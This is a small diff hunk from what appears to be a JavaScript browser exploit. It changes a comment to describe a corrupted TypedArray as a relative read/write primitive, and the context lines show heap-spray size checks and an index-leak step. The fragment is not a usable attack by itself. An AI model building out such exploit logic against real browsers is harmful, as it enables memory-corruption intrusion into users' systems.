@@ -306,7 +306,7 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
             {
                 if( biga.getUint32(i2, true) == spraylen && biga.getUint32(i2 + 4, true) > spraypos ){
                     
-                    // save a reference to the relative read TypedArray
+                    // save a reference to the relative read/write TypedArray
                     mydv = biga;
 
                     // leak the index
